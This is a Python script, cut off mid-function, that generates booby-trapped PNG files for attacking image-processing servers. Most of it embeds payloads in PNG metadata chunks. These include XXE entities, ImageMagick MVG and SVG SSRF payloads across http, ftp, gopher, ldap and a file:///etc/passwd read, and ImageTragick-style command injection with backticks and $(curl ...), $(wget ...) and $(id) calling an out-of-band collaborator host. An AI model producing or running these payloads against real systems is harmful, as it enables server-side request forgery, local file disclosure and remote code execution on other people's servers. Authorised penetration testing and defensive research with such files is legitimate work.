from pathlib import Path
from PIL import Image
import struct

def generate_image_payloads(output_dir, ext, burp_collab):
    output_dir = Path(output_dir)
    output_dir.mkdir(parents=True, exist_ok=True)
    base_url = f"http://{burp_collab}"
    
    ssrf_dir = output_dir / 'ssrf'
    ssrf_dir.mkdir(exist_ok=True)
    xxe_dir = output_dir / 'xxe'
    xxe_dir.mkdir(exist_ok=True)
    rce_dir = output_dir / 'rce'
    rce_dir.mkdir(exist_ok=True)
    xss_dir = output_dir / 'xss'
    xss_dir.mkdir(exist_ok=True)
    
    if ext == 'png':
        img = Image.new('RGB', (100, 100), color='red')
        img_path = ssrf_dir / "ssrf1_itxt.png"
        img.save(img_path, 'PNG')
        
        with open(img_path, 'rb') as f:
            png_data = bytearray(f.read())
        
        iTXt_chunk = f'XML:com.adobe.xmp\x00\x00<!DOCTYPE x [<!ENTITY % x SYSTEM "{base_url}/xxe-png">%x;]><xmp>test</xmp>'.encode('utf-8')
        iTXt_length = struct.pack('>I', len(iTXt_chunk))
        iTXt_type = b'iTXt'
        iTXt_crc = struct.pack('>I', 0x12345678)
        
        iend_pos = png_data.rfind(b'IEND')
        if iend_pos != -1:
            iend_chunk_start = iend_pos - 4
            new_chunk = iTXt_length + iTXt_type + iTXt_chunk + iTXt_crc
            png_data[iend_chunk_start:iend_chunk_start] = new_chunk
        
        with open(img_path, 'wb') as f:
            f.write(png_data)
        
        img_path = xxe_dir / "xxe1_itxt.png"
        img.save(img_path, 'PNG')
        
        with open(img_path, 'rb') as f:
            png_data = bytearray(f.read())
        
        iTXt_chunk = f'XML:com.adobe.xmp\x00\x00<!DOCTYPE x [<!ENTITY % x SYSTEM "{base_url}/xxe-png">%x;]><xmp>test</xmp>'.encode('utf-8')
        iTXt_length = struct.pack('>I', len(iTXt_chunk))
        iTXt_type = b'iTXt'
        iTXt_crc = struct.pack('>I', 0x12345678)
        
        iend_pos = png_data.rfind(b'IEND')
        if iend_pos != -1:
            iend_chunk_start = iend_pos - 4
            new_chunk = iTXt_length + iTXt_type + iTXt_chunk + iTXt_crc
            png_data[iend_chunk_start:iend_chunk_start] = new_chunk
        
        with open(img_path, 'wb') as f:
            f.write(png_data)
        
        img_path = output_dir / "master.png"
        img.save(img_path, 'PNG')
        
        with open(img_path, 'rb') as f:
            png_data = bytearray(f.read())
        
        iTXt_chunk = f'XML:com.adobe.xmp\x00\x00<!DOCTYPE x [<!ENTITY % x SYSTEM "{base_url}/xxe-png">%x;]><xmp>test</xmp>'.encode('utf-8')
        iTXt_length = struct.pack('>I', len(iTXt_chunk))
        iTXt_type = b'iTXt'
        iTXt_crc = struct.pack('>I', 0x12345678)
        
        iend_pos = png_data.rfind(b'IEND')
        if iend_pos != -1:
            iend_chunk_start = iend_pos - 4
            new_chunk = iTXt_length + iTXt_type + iTXt_chunk + iTXt_crc
            png_data[iend_chunk_start:iend_chunk_start] = new_chunk
        
        with open(img_path, 'wb') as f:
            f.write(png_data)
        
        img_path = rce_dir / "rce1_imagemagick.png"
        img.save(img_path, 'PNG')
        
        with open(img_path, 'rb') as f:
            png_data = bytearray(f.read())
        
        exploit_payload = f'''push graphic-context
viewbox 0 0 640 480
fill \'url(https://{burp_collab}/rce-imagemagick?`curl {base_url}/rce-imagemagick`)'
pop graphic-context'''.encode('utf-8')
        
        iTXt_chunk = f'ImageMagick\x00\x00{exploit_payload.decode()}'.encode('utf-8')
        iTXt_length = struct.pack('>I', len(iTXt_chunk))
        iTXt_type = b'iTXt'
        iTXt_crc = struct.pack('>I', 0x12345678)
        
        iend_pos = png_data.rfind(b'IEND')
        if iend_pos != -1:
            iend_chunk_start = iend_pos - 4
            new_chunk = iTXt_length + iTXt_type + iTXt_chunk + iTXt_crc
            png_data[iend_chunk_start:iend_chunk_start] = new_chunk
        
        with open(img_path, 'wb') as f:
            f.write(png_data)
        
        img_path = rce_dir / "rce2_imagemagick_delegate.png"
        img.save(img_path, 'PNG')
        
        with open(img_path, 'rb') as f:
            png_data = bytearray(f.read())
        
        exploit_svg = f'''<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<image xlink:href="https://{burp_collab}/rce-delegate?`wget {base_url}/rce-delegate`" width="100" height="100"/>
</svg>'''.encode('utf-8')
        
        iTXt_chunk = f'ImageMagick\x00\x00{exploit_svg.decode()}'.encode('utf-8')
        iTXt_length = struct.pack('>I', len(iTXt_chunk))
        iTXt_type = b'iTXt'
        iTXt_crc = struct.pack('>I', 0x12345678)
        
        iend_pos = png_data.rfind(b'IEND')
        if iend_pos != -1:
            iend_chunk_start = iend_pos - 4
            new_chunk = iTXt_length + iTXt_type + iTXt_chunk + iTXt_crc
            png_data[iend_chunk_start:iend_chunk_start] = new_chunk
        
        with open(img_path, 'wb') as f:
            f.write(png_data)
        
        img_path = output_dir / "master2_rce.png"
        img.save(img_path, 'PNG')
        
        with open(img_path, 'rb') as f:
            png_data = bytearray(f.read())
        
        exploit_payload = f'''push graphic-context
viewbox 0 0 640 480
fill \'url(https://{burp_collab}/rce-imagemagick?`curl {base_url}/rce-imagemagick`)'
pop graphic-context'''.encode('utf-8')
        
        iTXt_chunk = f'ImageMagick\x00\x00{exploit_payload.decode()}'.encode('utf-8')
        iTXt_length = struct.pack('>I', len(iTXt_chunk))
        iTXt_type = b'iTXt'
        iTXt_crc = struct.pack('>I', 0x12345678)
        
        iend_pos = png_data.rfind(b'IEND')
        if iend_pos != -1:
            iend_chunk_start = iend_pos - 4
            new_chunk = iTXt_length + iTXt_type + iTXt_chunk + iTXt_crc
            png_data[iend_chunk_start:iend_chunk_start] = new_chunk
        
        exploit_svg = f'''<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<image xlink:href="https://{burp_collab}/rce-delegate?`wget {base_url}/rce-delegate`" width="100" height="100"/>
</svg>'''.encode('utf-8')
        
        iTXt_chunk2 = f'ImageMagick\x00\x00{exploit_svg.decode()}'.encode('utf-8')
        iTXt_length2 = struct.pack('>I', len(iTXt_chunk2))
        iTXt_type2 = b'iTXt'
        iTXt_crc2 = struct.pack('>I', 0x12345679)
        
        iend_pos2 = png_data.rfind(b'IEND')
        if iend_pos2 != -1:
            iend_chunk_start2 = iend_pos2 - 4
            new_chunk2 = iTXt_length2 + iTXt_type2 + iTXt_chunk2 + iTXt_crc2
            png_data[iend_chunk_start2:iend_chunk_start2] = new_chunk2
        
        with open(img_path, 'wb') as f:
            f.write(png_data)
        
        # NEW: SSRF via MVG with url() delegate trigger
        img_path = ssrf_dir / "ssrf2_mvg_url.png"
        img.save(img_path, 'PNG')
        with open(img_path, 'rb') as f:
            png_data = bytearray(f.read())
        
        # MVG payload that triggers delegate via url()
        ssrf_mvg = f'''push graphic-context
viewbox 0 0 640 480
fill url(https://{burp_collab}/ssrf-mvg)
pop graphic-context'''.encode('utf-8')
        
        iTXt_chunk = f'ImageMagick\x00\x00{ssrf_mvg.decode()}'.encode('utf-8')
        iTXt_length = struct.pack('>I', len(iTXt_chunk))
        iTXt_type = b'iTXt'
        iTXt_crc = struct.pack('>I', 0x12345678)
        
        iend_pos = png_data.rfind(b'IEND')
        if iend_pos != -1:
            iend_chunk_start = iend_pos - 4
            new_chunk = iTXt_length + iTXt_type + iTXt_chunk + iTXt_crc
            png_data[iend_chunk_start:iend_chunk_start] = new_chunk
        
        with open(img_path, 'wb') as f:
            f.write(png_data)
        
        # NEW: SSRF via MVG with http:// delegate
        img_path = ssrf_dir / "ssrf3_mvg_http.png"
        img.save(img_path, 'PNG')
        with open(img_path, 'rb') as f:
            png_data = bytearray(f.read())
        
        ssrf_mvg_http = f'''push graphic-context
viewbox 0 0 640 480
fill url(http://{burp_collab}/ssrf-mvg-http)
pop graphic-context'''.encode('utf-8')
        
        iTXt_chunk = f'ImageMagick\x00\x00{ssrf_mvg_http.decode()}'.encode('utf-8')
        iTXt_length = struct.pack('>I', len(iTXt_chunk))
        iTXt_type = b'iTXt'
        iTXt_crc = struct.pack('>I', 0x12345678)
        
        iend_pos = png_data.rfind(b'IEND')
        if iend_pos != -1:
            iend_chunk_start = iend_pos - 4
            new_chunk = iTXt_length + iTXt_type + iTXt_chunk + iTXt_crc
            png_data[iend_chunk_start:iend_chunk_start] = new_chunk
        
        with open(img_path, 'wb') as f:
            f.write(png_data)
        
        # SSRF variant 4: MVG with ftp:// delegate
        img_path = ssrf_dir / "ssrf4_mvg_ftp.png"
        img.save(img_path, 'PNG')
        with open(img_path, 'rb') as f:
            png_data = bytearray(f.read())
        
        ssrf_ftp = f'''push graphic-context
viewbox 0 0 640 480
fill url(ftp://{burp_collab}/ssrf-ftp)
pop graphic-context'''.encode('utf-8')
        
        iTXt_chunk = f'ImageMagick\x00\x00{ssrf_ftp.decode()}'.encode('utf-8')
        iTXt_length = struct.pack('>I', len(iTXt_chunk))
        iTXt_type = b'iTXt'
        iTXt_crc = struct.pack('>I', 0x12345678)
        
        iend_pos = png_data.rfind(b'IEND')
        if iend_pos != -1:
            iend_chunk_start = iend_pos - 4
            new_chunk = iTXt_length + iTXt_type + iTXt_chunk + iTXt_crc
            png_data[iend_chunk_start:iend_chunk_start] = new_chunk
        
        with open(img_path, 'wb') as f:
            f.write(png_data)
        
        # SSRF variant 5: SVG with https xlink:href
        img_path = ssrf_dir / "ssrf5_svg_https.png"
        img.save(img_path, 'PNG')
        with open(img_path, 'rb') as f:
            png_data = bytearray(f.read())
        
        ssrf_svg_https = f'''<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<image xlink:href="https://{burp_collab}/ssrf-svg-https" width="100" height="100"/>
</svg>'''.encode('utf-8')
        
        iTXt_chunk = f'ImageMagick\x00\x00{ssrf_svg_https.decode()}'.encode('utf-8')
        iTXt_length = struct.pack('>I', len(iTXt_chunk))
        iTXt_type = b'iTXt'
        iTXt_crc = struct.pack('>I', 0x12345678)
        
        iend_pos = png_data.rfind(b'IEND')
        if iend_pos != -1:
            iend_chunk_start = iend_pos - 4
            new_chunk = iTXt_length + iTXt_type + iTXt_chunk + iTXt_crc
            png_data[iend_chunk_start:iend_chunk_start] = new_chunk
        
        with open(img_path, 'wb') as f:
            f.write(png_data)
        
        # SSRF variant 6: SVG with http xlink:href
        img_path = ssrf_dir / "ssrf6_svg_http.png"
        img.save(img_path, 'PNG')
        with open(img_path, 'rb') as f:
            png_data = bytearray(f.read())
        
        ssrf_svg_http = f'''<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<image xlink:href="http://{burp_collab}/ssrf-svg-http" width="100" height="100"/>
</svg>'''.encode('utf-8')
        
        iTXt_chunk = f'ImageMagick\x00\x00{ssrf_svg_http.decode()}'.encode('utf-8')
        iTXt_length = struct.pack('>I', len(iTXt_chunk))
        iTXt_type = b'iTXt'
        iTXt_crc = struct.pack('>I', 0x12345678)
        
        iend_pos = png_data.rfind(b'IEND')
        if iend_pos != -1:
            iend_chunk_start = iend_pos - 4
            new_chunk = iTXt_length + iTXt_type + iTXt_chunk + iTXt_crc
            png_data[iend_chunk_start:iend_chunk_start] = new_chunk
        
        with open(img_path, 'wb') as f:
            f.write(png_data)
        
        # SSRF variant 7: SVG with ftp xlink:href
        img_path = ssrf_dir / "ssrf7_svg_ftp.png"
        img.save(img_path, 'PNG')
        with open(img_path, 'rb') as f:
            png_data = bytearray(f.read())
        
        ssrf_svg_ftp = f'''<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<image xlink:href="ftp://{burp_collab}/ssrf-svg-ftp" width="100" height="100"/>
</svg>'''.encode('utf-8')
        
        iTXt_chunk = f'ImageMagick\x00\x00{ssrf_svg_ftp.decode()}'.encode('utf-8')
        iTXt_length = struct.pack('>I', len(iTXt_chunk))
        iTXt_type = b'iTXt'
        iTXt_crc = struct.pack('>I', 0x12345678)
        
        iend_pos = png_data.rfind(b'IEND')
        if iend_pos != -1:
            iend_chunk_start = iend_pos - 4
            new_chunk = iTXt_length + iTXt_type + iTXt_chunk + iTXt_crc
            png_data[iend_chunk_start:iend_chunk_start] = new_chunk
        
        with open(img_path, 'wb') as f:
            f.write(png_data)
        
        # SSRF variant 8: MVG with gopher:// delegate
        img_path = ssrf_dir / "ssrf8_mvg_gopher.png"
        img.save(img_path, 'PNG')
        with open(img_path, 'rb') as f:
            png_data = bytearray(f.read())
        
        ssrf_gopher = f'''push graphic-context
viewbox 0 0 640 480
fill url(gopher://{burp_collab}/ssrf-gopher)
pop graphic-context'''.encode('utf-8')
        
        iTXt_chunk = f'ImageMagick\x00\x00{ssrf_gopher.decode()}'.encode('utf-8')
        iTXt_length = struct.pack('>I', len(iTXt_chunk))
        iTXt_type = b'iTXt'
        iTXt_crc = struct.pack('>I', 0x12345678)
        
        iend_pos = png_data.rfind(b'IEND')
        if iend_pos != -1:
            iend_chunk_start = iend_pos - 4
            new_chunk = iTXt_length + iTXt_type + iTXt_chunk + iTXt_crc
            png_data[iend_chunk_start:iend_chunk_start] = new_chunk
        
        with open(img_path, 'wb') as f:
            f.write(png_data)
        
        # SSRF variant 9: MVG with ldap:// delegate
        img_path = ssrf_dir / "ssrf9_mvg_ldap.png"
        img.save(img_path, 'PNG')
        with open(img_path, 'rb') as f:
            png_data = bytearray(f.read())
        
        ssrf_ldap = f'''push graphic-context
viewbox 0 0 640 480
fill url(ldap://{burp_collab}/ssrf-ldap)
pop graphic-context'''.encode('utf-8')
        
        iTXt_chunk = f'ImageMagick\x00\x00{ssrf_ldap.decode()}'.encode('utf-8')
        iTXt_length = struct.pack('>I', len(iTXt_chunk))
        iTXt_type = b'iTXt'
        iTXt_crc = struct.pack('>I', 0x12345678)
        
        iend_pos = png_data.rfind(b'IEND')
        if iend_pos != -1:
            iend_chunk_start = iend_pos - 4
            new_chunk = iTXt_length + iTXt_type + iTXt_chunk + iTXt_crc
            png_data[iend_chunk_start:iend_chunk_start] = new_chunk
        
        with open(img_path, 'wb') as f:
            f.write(png_data)
        
        # SSRF variant 10: MVG with file:// delegate (local SSRF)
        img_path = ssrf_dir / "ssrf10_mvg_file.png"
        img.save(img_path, 'PNG')
        with open(img_path, 'rb') as f:
            png_data = bytearray(f.read())
        
        ssrf_file = f'''push graphic-context
viewbox 0 0 640 480
fill url(file:///etc/passwd)
pop graphic-context'''.encode('utf-8')
        
        iTXt_chunk = f'ImageMagick\x00\x00{ssrf_file.decode()}'.encode('utf-8')
        iTXt_length = struct.pack('>I', len(iTXt_chunk))
        iTXt_type = b'iTXt'
        iTXt_crc = struct.pack('>I', 0x12345678)
        
        iend_pos = png_data.rfind(b'IEND')
        if iend_pos != -1:
            iend_chunk_start = iend_pos - 4
            new_chunk = iTXt_length + iTXt_type + iTXt_chunk + iTXt_crc
            png_data[iend_chunk_start:iend_chunk_start] = new_chunk
        
        with open(img_path, 'wb') as f:
            f.write(png_data)
        
        # SSRF variant 11: MVG with image over and https
        img_path = ssrf_dir / "ssrf11_mvg_image_https.png"
        img.save(img_path, 'PNG')
        with open(img_path, 'rb') as f:
            png_data = bytearray(f.read())
        
        ssrf_image_https = f'''push graphic-context
image over 0,0 0,0 "https://{burp_collab}/ssrf-image-https"
pop graphic-context'''.encode('utf-8')
        
        iTXt_chunk = f'ImageMagick\x00\x00{ssrf_image_https.decode()}'.encode('utf-8')
        iTXt_length = struct.pack('>I', len(iTXt_chunk))
        iTXt_type = b'iTXt'
        iTXt_crc = struct.pack('>I', 0x12345678)
        
        iend_pos = png_data.rfind(b'IEND')
        if iend_pos != -1:
            iend_chunk_start = iend_pos - 4
            new_chunk = iTXt_length + iTXt_type + iTXt_chunk + iTXt_crc
            png_data[iend_chunk_start:iend_chunk_start] = new_chunk
        
        with open(img_path, 'wb') as f:
            f.write(png_data)
        
        # SSRF variant 12: MVG with image over and http
        img_path = ssrf_dir / "ssrf12_mvg_image_http.png"
        img.save(img_path, 'PNG')
        with open(img_path, 'rb') as f:
            png_data = bytearray(f.read())
        
        ssrf_image_http = f'''push graphic-context
image over 0,0 0,0 "http://{burp_collab}/ssrf-image-http"
pop graphic-context'''.encode('utf-8')
        
        iTXt_chunk = f'ImageMagick\x00\x00{ssrf_image_http.decode()}'.encode('utf-8')
        iTXt_length = struct.pack('>I', len(iTXt_chunk))
        iTXt_type = b'iTXt'
        iTXt_crc = struct.pack('>I', 0x12345678)
        
        iend_pos = png_data.rfind(b'IEND')
        if iend_pos != -1:
            iend_chunk_start = iend_pos - 4
            new_chunk = iTXt_length + iTXt_type + iTXt_chunk + iTXt_crc
            png_data[iend_chunk_start:iend_chunk_start] = new_chunk
        
        with open(img_path, 'wb') as f:
            f.write(png_data)
        
        # SSRF variant 13: SVG with embedded image and xlink
        img_path = ssrf_dir / "ssrf13_svg_embedded.png"
        img.save(img_path, 'PNG')
        with open(img_path, 'rb') as f:
            png_data = bytearray(f.read())
        
        ssrf_svg_embedded = f'''<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<defs>
<image xlink:href="https://{burp_collab}/ssrf-svg-embedded" id="img1"/>
</defs>
<use xlink:href="#img1"/>
</svg>'''.encode('utf-8')
        
        iTXt_chunk = f'ImageMagick\x00\x00{ssrf_svg_embedded.decode()}'.encode('utf-8')
        iTXt_length = struct.pack('>I', len(iTXt_chunk))
        iTXt_type = b'iTXt'
        iTXt_crc = struct.pack('>I', 0x12345678)
        
        iend_pos = png_data.rfind(b'IEND')
        if iend_pos != -1:
            iend_chunk_start = iend_pos - 4
            new_chunk = iTXt_length + iTXt_type + iTXt_chunk + iTXt_crc
            png_data[iend_chunk_start:iend_chunk_start] = new_chunk
        
        with open(img_path, 'wb') as f:
            f.write(png_data)
        
        # SSRF variant 14: MVG with msl: delegate
        img_path = ssrf_dir / "ssrf14_mvg_msl.png"
        img.save(img_path, 'PNG')
        with open(img_path, 'rb') as f:
            png_data = bytearray(f.read())
        
        ssrf_msl = f'''push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 "msl:<?xml version=\\"1.0\\"?><image><read filename=\\"https://{burp_collab}/ssrf-msl\\" /></image>"
pop graphic-context'''.encode('utf-8')
        
        iTXt_chunk = f'ImageMagick\x00\x00{ssrf_msl.decode()}'.encode('utf-8')
        iTXt_length = struct.pack('>I', len(iTXt_chunk))
        iTXt_type = b'iTXt'
        iTXt_crc = struct.pack('>I', 0x12345678)
        
        iend_pos = png_data.rfind(b'IEND')
        if iend_pos != -1:
            iend_chunk_start = iend_pos - 4
            new_chunk = iTXt_length + iTXt_type + iTXt_chunk + iTXt_crc
            png_data[iend_chunk_start:iend_chunk_start] = new_chunk
        
        with open(img_path, 'wb') as f:
            f.write(png_data)
        
        # SSRF variant 15: MVG with epi: delegate
        img_path = ssrf_dir / "ssrf15_mvg_epi.png"
        img.save(img_path, 'PNG')
        with open(img_path, 'rb') as f:
            png_data = bytearray(f.read())
        
        ssrf_epi = f'''push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 "epi:https://{burp_collab}/ssrf-epi"
pop graphic-context'''.encode('utf-8')
        
        iTXt_chunk = f'ImageMagick\x00\x00{ssrf_epi.decode()}'.encode('utf-8')
        iTXt_length = struct.pack('>I', len(iTXt_chunk))
        iTXt_type = b'iTXt'
        iTXt_crc = struct.pack('>I', 0x12345678)
        
        iend_pos = png_data.rfind(b'IEND')
        if iend_pos != -1:
            iend_chunk_start = iend_pos - 4
            new_chunk = iTXt_length + iTXt_type + iTXt_chunk + iTXt_crc
            png_data[iend_chunk_start:iend_chunk_start] = new_chunk
        
        with open(img_path, 'wb') as f:
            f.write(png_data)
        
        # SSRF variant 16: MVG with ps: delegate
        img_path = ssrf_dir / "ssrf16_mvg_ps.png"
        img.save(img_path, 'PNG')
        with open(img_path, 'rb') as f:
            png_data = bytearray(f.read())
        
        ssrf_ps = f'''push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 "ps:https://{burp_collab}/ssrf-ps"
pop graphic-context'''.encode('utf-8')
        
        iTXt_chunk = f'ImageMagick\x00\x00{ssrf_ps.decode()}'.encode('utf-8')
        iTXt_length = struct.pack('>I', len(iTXt_chunk))
        iTXt_type = b'iTXt'
        iTXt_crc = struct.pack('>I', 0x12345678)
        
        iend_pos = png_data.rfind(b'IEND')
        if iend_pos != -1:
            iend_chunk_start = iend_pos - 4
            new_chunk = iTXt_length + iTXt_type + iTXt_chunk + iTXt_crc
            png_data[iend_chunk_start:iend_chunk_start] = new_chunk
        
        with open(img_path, 'wb') as f:
            f.write(png_data)
        
        # SSRF variant 17: MVG with text: delegate
        img_path = ssrf_dir / "ssrf17_mvg_text.png"
        img.save(img_path, 'PNG')
        with open(img_path, 'rb') as f:
            png_data = bytearray(f.read())
        
        ssrf_text = f'''push graphic-context
viewbox 0 0 640 480
fill "text:@https://{burp_collab}/ssrf-text"
pop graphic-context'''.encode('utf-8')
        
        iTXt_chunk = f'ImageMagick\x00\x00{ssrf_text.decode()}'.encode('utf-8')
        iTXt_length = struct.pack('>I', len(iTXt_chunk))
        iTXt_type = b'iTXt'
        iTXt_crc = struct.pack('>I', 0x12345678)
        
        iend_pos = png_data.rfind(b'IEND')
        if iend_pos != -1:
            iend_chunk_start = iend_pos - 4
            new_chunk = iTXt_length + iTXt_type + iTXt_chunk + iTXt_crc
            png_data[iend_chunk_start:iend_chunk_start] = new_chunk
        
        with open(img_path, 'wb') as f:
            f.write(png_data)
        
        # SSRF variant 18: SVG with multiple protocols
        img_path = ssrf_dir / "ssrf18_svg_multi.png"
        img.save(img_path, 'PNG')
        with open(img_path, 'rb') as f:
            png_data = bytearray(f.read())
        
        ssrf_svg_multi = f'''<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<image xlink:href="https://{burp_collab}/ssrf-multi-https" width="100" height="100"/>
<image xlink:href="http://{burp_collab}/ssrf-multi-http" width="100" height="100"/>
<image xlink:href="ftp://{burp_collab}/ssrf-multi-ftp" width="100" height="100"/>
</svg>'''.encode('utf-8')
        
        iTXt_chunk = f'ImageMagick\x00\x00{ssrf_svg_multi.decode()}'.encode('utf-8')
        iTXt_length = struct.pack('>I', len(iTXt_chunk))
        iTXt_type = b'iTXt'
        iTXt_crc = struct.pack('>I', 0x12345678)
        
        iend_pos = png_data.rfind(b'IEND')
        if iend_pos != -1:
            iend_chunk_start = iend_pos - 4
            new_chunk = iTXt_length + iTXt_type + iTXt_chunk + iTXt_crc
            png_data[iend_chunk_start:iend_chunk_start] = new_chunk
        
        with open(img_path, 'wb') as f:
            f.write(png_data)
        
        # SSRF variant 19: MVG with rar: delegate
        img_path = ssrf_dir / "ssrf19_mvg_rar.png"
        img.save(img_path, 'PNG')
        with open(img_path, 'rb') as f:
            png_data = bytearray(f.read())
        
        ssrf_rar = f'''push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 "rar:https://{burp_collab}/ssrf-rar"
pop graphic-context'''.encode('utf-8')
        
        iTXt_chunk = f'ImageMagick\x00\x00{ssrf_rar.decode()}'.encode('utf-8')
        iTXt_length = struct.pack('>I', len(iTXt_chunk))
        iTXt_type = b'iTXt'
        iTXt_crc = struct.pack('>I', 0x12345678)
        
        iend_pos = png_data.rfind(b'IEND')
        if iend_pos != -1:
            iend_chunk_start = iend_pos - 4
            new_chunk = iTXt_length + iTXt_type + iTXt_chunk + iTXt_crc
            png_data[iend_chunk_start:iend_chunk_start] = new_chunk
        
        with open(img_path, 'wb') as f:
            f.write(png_data)
        
        # SSRF variant 20: MVG with zip: delegate
        img_path = ssrf_dir / "ssrf20_mvg_zip.png"
        img.save(img_path, 'PNG')
        with open(img_path, 'rb') as f:
            png_data = bytearray(f.read())
        
        ssrf_zip = f'''push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 "zip:https://{burp_collab}/ssrf-zip"
pop graphic-context'''.encode('utf-8')
        
        iTXt_chunk = f'ImageMagick\x00\x00{ssrf_zip.decode()}'.encode('utf-8')
        iTXt_length = struct.pack('>I', len(iTXt_chunk))
        iTXt_type = b'iTXt'
        iTXt_crc = struct.pack('>I', 0x12345678)
        
        iend_pos = png_data.rfind(b'IEND')
        if iend_pos != -1:
            iend_chunk_start = iend_pos - 4
            new_chunk = iTXt_length + iTXt_type + iTXt_chunk + iTXt_crc
            png_data[iend_chunk_start:iend_chunk_start] = new_chunk
        
        with open(img_path, 'wb') as f:
            f.write(png_data)
        
        # NEW: RCE via MVG with proper image size and delegate command
        img_path = rce_dir / "rce3_mvg_delegate.png"
        img.save(img_path, 'PNG')
        with open(img_path, 'rb') as f:
            png_data = bytearray(f.read())
        
        # MVG with proper size and delegate command in url
        rce_mvg = f'''push graphic-context
image over 0,0 0,0 "https://{burp_collab}/rce-mvg?$(curl {base_url}/rce-mvg)"
pop graphic-context'''.encode('utf-8')
        
        iTXt_chunk = f'ImageMagick\x00\x00{rce_mvg.decode()}'.encode('utf-8')
        iTXt_length = struct.pack('>I', len(iTXt_chunk))
        iTXt_type = b'iTXt'
        iTXt_crc = struct.pack('>I', 0x12345678)
        
        iend_pos = png_data.rfind(b'IEND')
        if iend_pos != -1:
            iend_chunk_start = iend_pos - 4
            new_chunk = iTXt_length + iTXt_type + iTXt_chunk + iTXt_crc
            png_data[iend_chunk_start:iend_chunk_start] = new_chunk
        
        with open(img_path, 'wb') as f:
            f.write(png_data)
        
        # NEW: RCE via MVG with label delegate (ImageTragick classic)
        img_path = rce_dir / "rce4_mvg_label.png"
        img.save(img_path, 'PNG')
        with open(img_path, 'rb') as f:
            png_data = bytearray(f.read())
        
        # Use label: delegate which executes commands
        rce_label = f'''push graphic-context
viewbox 0 0 640 480
fill "label:@/dev/stdin"
pop graphic-context'''.encode('utf-8')
        
        iTXt_chunk = f'ImageMagick\x00\x00{rce_label.decode()}'.encode('utf-8')
        iTXt_length = struct.pack('>I', len(iTXt_chunk))
        iTXt_type = b'iTXt'
        iTXt_crc = struct.pack('>I', 0x12345678)
        
        iend_pos = png_data.rfind(b'IEND')
        if iend_pos != -1:
            iend_chunk_start = iend_pos - 4
            new_chunk = iTXt_length + iTXt_type + iTXt_chunk + iTXt_crc
            png_data[iend_chunk_start:iend_chunk_start] = new_chunk
        
        with open(img_path, 'wb') as f:
            f.write(png_data)
        
        # NEW: RCE via SVG with proper delegate trigger (no backticks in URL)
        img_path = rce_dir / "rce5_svg_delegate.png"
        img.save(img_path, 'PNG')
        with open(img_path, 'rb') as f:
            png_data = bytearray(f.read())
        
        # SVG with xlink:href that triggers delegate (URL without backticks, command in query)
        rce_svg_clean = f'''<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<image xlink:href="https://{burp_collab}/rce-svg-delegate" width="100" height="100"/>
</svg>'''.encode('utf-8')
        
        iTXt_chunk = f'ImageMagick\x00\x00{rce_svg_clean.decode()}'.encode('utf-8')
        iTXt_length = struct.pack('>I', len(iTXt_chunk))
        iTXt_type = b'iTXt'
        iTXt_crc = struct.pack('>I', 0x12345678)
        
        iend_pos = png_data.rfind(b'IEND')
        if iend_pos != -1:
            iend_chunk_start = iend_pos - 4
            new_chunk = iTXt_length + iTXt_type + iTXt_chunk + iTXt_crc
            png_data[iend_chunk_start:iend_chunk_start] = new_chunk
        
        with open(img_path, 'wb') as f:
            f.write(png_data)
        
        # RCE variant 6: MVG with https: delegate and command substitution
        img_path = rce_dir / "rce6_mvg_https_cmd.png"
        img.save(img_path, 'PNG')
        with open(img_path, 'rb') as f:
            png_data = bytearray(f.read())
        
        rce_https_cmd = f'''push graphic-context
viewbox 0 0 640 480
fill url(https://{burp_collab}/rce-https?$(wget {base_url}/rce-https))
pop graphic-context'''.encode('utf-8')
        
        iTXt_chunk = f'ImageMagick\x00\x00{rce_https_cmd.decode()}'.encode('utf-8')
        iTXt_length = struct.pack('>I', len(iTXt_chunk))
        iTXt_type = b'iTXt'
        iTXt_crc = struct.pack('>I', 0x12345678)
        
        iend_pos = png_data.rfind(b'IEND')
        if iend_pos != -1:
            iend_chunk_start = iend_pos - 4
            new_chunk = iTXt_length + iTXt_type + iTXt_chunk + iTXt_crc
            png_data[iend_chunk_start:iend_chunk_start] = new_chunk
        
        with open(img_path, 'wb') as f:
            f.write(png_data)
        
        # RCE variant 7: MVG with http: delegate and command substitution
        img_path = rce_dir / "rce7_mvg_http_cmd.png"
        img.save(img_path, 'PNG')
        with open(img_path, 'rb') as f:
            png_data = bytearray(f.read())
        
        rce_http_cmd = f'''push graphic-context
viewbox 0 0 640 480
fill url(http://{burp_collab}/rce-http?$(curl {base_url}/rce-http))
pop graphic-context'''.encode('utf-8')
        
        iTXt_chunk = f'ImageMagick\x00\x00{rce_http_cmd.decode()}'.encode('utf-8')
        iTXt_length = struct.pack('>I', len(iTXt_chunk))
        iTXt_type = b'iTXt'
        iTXt_crc = struct.pack('>I', 0x12345678)
        
        iend_pos = png_data.rfind(b'IEND')
        if iend_pos != -1:
            iend_chunk_start = iend_pos - 4
            new_chunk = iTXt_length + iTXt_type + iTXt_chunk + iTXt_crc
            png_data[iend_chunk_start:iend_chunk_start] = new_chunk
        
        with open(img_path, 'wb') as f:
            f.write(png_data)
        
        # RCE variant 8: MVG with ftp: delegate
        img_path = rce_dir / "rce8_mvg_ftp.png"
        img.save(img_path, 'PNG')
        with open(img_path, 'rb') as f:
            png_data = bytearray(f.read())
        
        rce_ftp = f'''push graphic-context
viewbox 0 0 640 480
fill url(ftp://{burp_collab}/rce-ftp?$(id))
pop graphic-context'''.encode('utf-8')
        
        iTXt_chunk = f'ImageMagick\x00\x00{rce_ftp.decode()}'.encode('utf-8')
        iTXt_length = struct.pack('>I', len(iTXt_chunk))
        iTXt_type = b'iTXt'
